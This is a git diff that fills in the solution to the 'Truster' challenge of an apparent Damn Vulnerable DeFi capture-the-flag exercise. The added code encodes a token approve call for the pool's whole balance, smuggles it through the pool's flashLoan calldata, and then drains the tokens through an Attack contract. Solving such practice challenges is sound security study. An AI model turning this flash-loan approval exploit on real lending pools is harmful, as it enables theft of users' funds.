@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import { Attack } from "../../src/truster/Attack.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -49,10 +50,17 @@ contract TrusterChallenge is Test {
 
     /**
      * CODE YOUR SOLUTION HERE
+     * 
+     * 
      */
     function test_truster() public checkSolvedByPlayer {
         
-    }
+        Attack attack = new Attack( token, pool, recovery );
+
+        bytes memory _approve = abi.encodeWithSignature("approve(address,uint256)", address(attack), TOKENS_IN_POOL);
+        bytes memory flash = abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)", 0, recovery, token, _approve );
+        attack.attack( flash, TOKENS_IN_POOL );
+    }   
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
